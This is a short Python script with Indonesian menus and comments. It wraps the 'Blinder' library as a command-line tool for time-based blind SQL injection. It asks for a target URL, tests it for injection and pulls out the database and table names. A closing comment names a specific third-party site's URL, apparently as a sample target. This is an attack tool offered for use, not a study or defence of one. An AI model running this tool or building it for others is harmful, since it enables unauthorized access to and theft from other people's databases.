import Blinder
from cfonts import *
from termcolor import colored
from pyfiglet import *

#pembukaan alat blind SQLpy
f = Figlet(font='standard')
print(colored(f.renderText('blind SQLpy')))
print(
"""
 [>] Di Koding Oleh : Galih Anggoro Prasetya
 [>] Github         : https://github.com/galihap76
"""
)
print('\n')
#blind SQLpy
print("""
===================================
[+]       SQL INJECTION        [+]
===================================
 [1] CEK INJEKSI URL TARGET              
 [2] DAPATKAN NAMA DATABASE
 [3] DAPATKAN NAMA TABEL
 [4] INFO PENYERANGAN                   
 [5] Keluar                    
                              
================================

""")

while True:
 print("\n")
 #tanya user
 tanyaUser = input("[+] pilih nomor yang anda mau : ")

#jika user pilih nomor 1
 if tanyaUser == "1":
         #cek injeksi url target
         blind_SQLpy = input("[+] masukkan URL sasaran pada blind SQLpy : ")
         blind = Blinder.blinder(blind_SQLpy,sleep=1)
         print ("[!] Bernilai : ",blind.check_injection())
         break
#jika user pilih nomor 2
 elif tanyaUser == "2":
         #dapatkan nama database target
         blind_SQLpy = input("[+] masukkan URL sasaran pada blind SQLpy : ")
         blind = Blinder.blinder(blind_SQLpy,sleep=1)
         print ("Nama database target : ",blind.get_database())
         break
#jika user pilih nomor 3
 elif tanyaUser == "3":
         #dapatkan nama tabel target
         blind_SQLpy = input("[+] masukkan URL sasaran pada blind SQLpy : ")
         blind = Blinder.blinder(blind_SQLpy,sleep=1)
         tabel = blind.get_tables()

         for tabelSasaran in tabel:
              print (tabelSasaran)
         break
#jika user pilih nomor 4
 elif tanyaUser == "4":
         #berikan info penyerangan
         print("""
[!] Info penyerangan :
 penyerangan pada alat blind SQLpy menggunakan dasar waktu sql pastikan koneksi internet menyala, penyerangan ini membutuhkan waktu yang lama agar bisa mendapatkan
 database atau tabel target. Harap menunggu ketika ingin mendapatkan database atau tabel pada target yang anda incar.


 """)
         break
















"""
sasaran = input("Masukkan sasaran url : ")
blind = Blinder.blinder(sasaran,sleep=1)
print ("[!] Cek injeksi URL : ",blind.check_injection())


print "Database name is : %s " % blind.get_database()
"""

#http://www.asfaa.org/members.php?id=1
